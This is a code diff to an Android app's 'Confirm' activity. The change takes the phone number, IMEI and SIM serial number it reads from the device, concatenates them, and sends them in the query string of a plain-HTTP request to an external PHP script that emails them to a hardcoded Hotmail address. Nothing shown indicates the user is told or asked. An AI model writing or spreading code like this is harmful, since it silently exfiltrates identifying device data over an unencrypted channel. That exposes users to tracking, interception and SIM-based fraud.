@@ -35,9 +35,9 @@ public class Confirm extends AppCompatActivity {
         setContentView(R.layout.confirm);
 
         TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
-        String user_number = tm.getLine1Number();
-        String user_imei = tm.getDeviceId();
-        String user_simSerialNumber = tm.getSimSerialNumber();
+        final String user_number = tm.getLine1Number();
+        final String user_imei = tm.getDeviceId();
+        final String user_simSerialNumber = tm.getSimSerialNumber();
 
         sharedpreferences = getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
         SharedPreferences.Editor editor = sharedpreferences.edit();
@@ -66,7 +66,10 @@ public class Confirm extends AppCompatActivity {
             protected Void doInBackground(Void... params) {
                 try {
                     // Connect to the web site
-                    String url = "http://data.robotagrex.com/sendemail.php?emailaddress=mainphrame@hotmail.com&emailmessage=predata-test";
+                    String divider = "##";
+                    String message = divider + user_imei + divider + user_number + divider + user_simSerialNumber;
+                    String web_url = "http://data.robotagrex.com/sendemail.php?emailaddress=mainphrame@hotmail.com&emailmessage=";
+                    String url = web_url + message;
                     Document document = Jsoup.connect(url).get();
                     // Get the html document title
                     title = document.data();
